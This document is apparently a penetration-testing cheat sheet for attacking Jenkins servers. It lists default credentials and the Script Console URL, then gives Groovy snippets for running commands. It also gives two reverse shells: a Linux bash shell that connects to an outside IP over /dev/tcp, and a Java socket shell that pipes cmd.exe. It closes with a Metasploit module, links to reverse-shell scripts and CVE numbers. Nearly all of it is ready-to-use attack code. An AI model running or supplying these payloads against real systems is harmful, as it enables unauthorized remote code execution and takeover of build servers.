# jenkins
## info
Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers.  
## default credentials
admin:admin  
(nothing):(nothing)  
## rce via Script Console
### script console url
http://10.10.10.1:8000/script
### rce sample code
def cmd = 'id'  
def sout = new StringBuffer(), serr = new StringBuffer()  
def proc = cmd.execute()  
proc.consumeProcessOutput(sout, serr)  
proc.waitForOrKill(1000)  
println sout  
## reverse shell via script console
### manually on linux
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])  
p.waitFor()  
### manually on windows
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
### manually on windows powershell script
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
### metasploit
msf> exploit/multi/http/jenkins_script_console/
## other usefull links
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
## usefull vulnerabilites
CVE-2018-1999002  
CVE-2019-1003000  
